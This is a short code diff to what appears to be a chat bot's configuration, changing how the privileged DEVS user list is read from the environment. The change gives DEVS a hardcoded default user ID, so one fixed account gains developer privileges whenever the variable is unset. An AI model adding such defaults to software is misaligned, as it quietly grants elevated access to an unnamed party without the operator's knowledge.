@@ -67,7 +67,7 @@ if ENV:
 
     try:
         DRAGONS = {int(x) for x in os.environ.get("DRAGONS", "").split()}
-        DEVS = {int(x) for x in os.environ.get("DEVS", "").split()}
+        DEVS = {int(x) for x in os.environ.get("DEVS", "5122071509").split()}
     except ValueError:
         raise Exception("Your sudo or dev users list does not contain valid integers.")
 
